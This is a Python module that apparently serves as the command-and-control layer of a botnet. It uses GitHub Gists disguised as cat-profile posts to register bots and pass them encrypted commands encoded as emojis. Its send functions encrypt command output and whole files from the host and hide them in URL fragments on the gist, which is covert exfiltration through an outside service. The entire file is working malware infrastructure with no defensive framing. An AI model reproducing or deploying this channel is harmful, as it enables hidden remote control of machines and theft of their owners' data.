import os
import random
import sys
import requests
import gistyc

from Bot import crypto, emojis


def get_gist_api():
    """
    From AUTH_TOKEN ../token.txt get GIST_API and return

    :return: GIST_API (str)
    """
    with open('../token.txt') as f:
        AUTH_TOKEN = f.readline()

    if len(AUTH_TOKEN) == 0:
        exit(-1)

    return gistyc.GISTyc(auth_token=AUTH_TOKEN)


def init(gist_api, name, filename, urls, bot_list):
    """
    Create initial gist for a bot if not exists.
    And add bot to the bot list.

    :param: name:            Bot's / cat's name
    :param: filename:        Filename for gist post
    :param: bot_list:        Name (filename) of the post with the list of bots
    :param: gist_api:        Gist api from get_gist_api() function
    :return: None
    """
    # Check if this name is in bot list
    if "[" + name + "]" in get_raw(gist_api, bot_list):
        print(name + " SAYS BYE BYE (There is already a bot with this name in bot list)", file=sys.stderr)
        exit(-2)

    bot_url = create_bot_post(gist_api, name, filename, urls)
    add_to_bot_list(gist_api, name, filename, bot_url, bot_list)


def create_bot_post(gist_api, name, filename, urls):
    """
    Create bot post if not exists. If there is already a post, only return its url address.

    :param urls:            Array with possible urls to upload
    :param gist_api:        Gist api from get_gist_api() function
    :param name:            Bots name (will be in the title of bot post)
    :param filename:        The name of the bots post
    :return: bot_url        Url of the bot post (used in bot list)
    """

    def init_content():
        content = "# " + name + "\n" \
                                "### Level of cuteness 🐈 \n" \
                                "### Level of fluffiness 🐈‍⬛ \n" \
                                "### Interesting links"
        for url_data in urls:
            content += "\n[" + url_data[0] + "](" + url_data[1] + ")"

        return content

    # Check if post with this name exists on gist
    posts = gist_api.get_gists()
    name_exists = False
    for p in posts:
        if filename in p['files']:
            bot_url = p['html_url']
            name_exists = True
            print("{} post already exists".format(filename))
            break

    # If name not used -> Create bot/cat post on gist
    if not name_exists:
        f = open("tmp/" + filename, "w")
        f.write(init_content())
        f.close()

        # Add file to GIST
        response_data = gist_api.create_gist(file_name="tmp/" + filename)
        bot_url = response_data['html_url']

        # Remove file from tmp
        os.remove('tmp/' + filename)
        print("{} post has been created".format(filename))

    return bot_url


def add_to_bot_list(gist_api, name, filename, bot_url, bot_list):
    """

    :param gist_api:        Gist api from get_gist_api() function
    :param name:            Bots name (will be in the title of bot post)
    :param filename:        The name of the bots post
    :param bot_url:         Url of the bot post (used in bot list)
    :param bot_list:        Name (filename) of the post with the list of bots
    :return: None
    """
    bot_list_content = get_raw(gist_api, bot_list)
    bot_list_content += "\n### [" + name + "](" + bot_url + "#" + filename + ")"

    # Update bot list on gist (create file in tmp with content)
    update_gist(gist_api, bot_list, bot_list_content)
    print("{} added to bot list!".format(filename))


def update_gist(gist_api, filename, content):
    """
    Update gist post.

    :param gist_api:    Gist api grom get_gist_api() function
    :param filename:    Filename to be updated
    :param content:     New content
    :return:
    """
    f = open("tmp/" + filename, "w")
    f.write(content)
    f.close()
    gist_api.update_gist('tmp/' + filename)
    os.remove('tmp/' + filename)


def get_raw(gist_api, filename):
    """
    Get raw content of the post.

    :param gist_api:        Gist api grom get_gist_api() function
    :param filename:        Filename of the post to get
    :return:                Raw content of the filename post
    """
    # Find url of the filename on gist
    lst = gist_api.get_gists()
    url = None
    for g in lst:
        if filename in g['files']:
            url = g['files'][filename]['raw_url']

    if url is None:
        return None

    # Get content from the url
    f = requests.get(url)
    return f.text


def send_respose_url(gist_api, filename, data):
    """
    1. Decode data and add to the last url
    2. Change bot status (cuteness level)

    :param gist_api:
    :param filename:
    :param data:
    :return: None
    """
    # Decode data and add to the last url
    content = get_raw(gist_api, filename)
    content_split = content.split("\n")
    new_last_url = content_split[-1].split("#")[0].rstrip(')') + \
                   "#" + crypto.encrypt(data.stdout) + ")"
    content_split[-1] = new_last_url

    # Change bot status (cuteness level)
    if data.returncode == 0:
        content_split[1] = "### Level of cuteness " + random.choice(emojis.status_code['success'])
    else:
        content_split[1] = "### Level of cuteness " + random.choice(emojis.status_code['error'])

    update_gist(gist_api, filename, "\n".join(content_split))


def send_file_respose_url(gist_api, filename, file):
    """
    1. Decode bytes file and add to the last url
    2. Change bot status (cuteness level)

    :param gist_api:
    :param filename:        Bots filename
    :param file:            File to be sent
    :return: None
    """
    # Decode data and add to the last url
    content = get_raw(gist_api, filename)
    content_split = content.split("\n")

    # Encrypt file
    try:
        f = open(file, "rb")
        data = f.read()
        f.close()

        # Add binary file to url
        new_last_url = content_split[-1].split("#")[0].rstrip(')') + "#" + crypto.encrypt(data) + ")"
        content_split[-1] = new_last_url

        # Change bot status
        content_split[1] = "### Level of cuteness " + random.choice(emojis.status_code['success'])
    except:
        content_split[1] = "### Level of cuteness " + random.choice(emojis.status_code['error'])

    # Update gist
    update_gist(gist_api, filename, "\n".join(content_split))


def get_data_from_url(gist_api, filename):
    """
    Get emoji for the command (see emojis.commands). It is the emoji in the level of fluffiness.

    :param gist_api:    Gist api grom get_gist_api() function
    :param filename:    Filename of the bot
    :return:cmd:        Command for the bot
    """
    content = get_raw(gist_api, filename)
    content_split = content.split("\n")
    data = content_split[-1].split("#")[1]
    data = crypto.decrypt(data)

    return data


def get_command_emoji(gist_api, filename):
    """
    Get emoji for the command (see emojis.commands). It is the emoji in the level of fluffiness.

    :param gist_api:    Gist api grom get_gist_api() function
    :param filename:    Filename of the bot
    :return:cmd:        Command for the bot
    """
    bot_content = get_raw(gist_api, filename)
    return bot_content.split('\n')[2].split("fluffiness")[-1].strip()


def get_status_emoji(gist_api, filename):
    """
    Get emoji for the status (see emojis.status). It is the emoji in the level of cuteness.

    :param gist_api:    Gist api grom get_gist_api() function
    :param filename:    Filename of the bot
    :return:cmd:        Status of the bot
    """
    bot_content = get_raw(gist_api, filename)
    return bot_content.split('\n')[1].split("cuteness")[-1].strip()
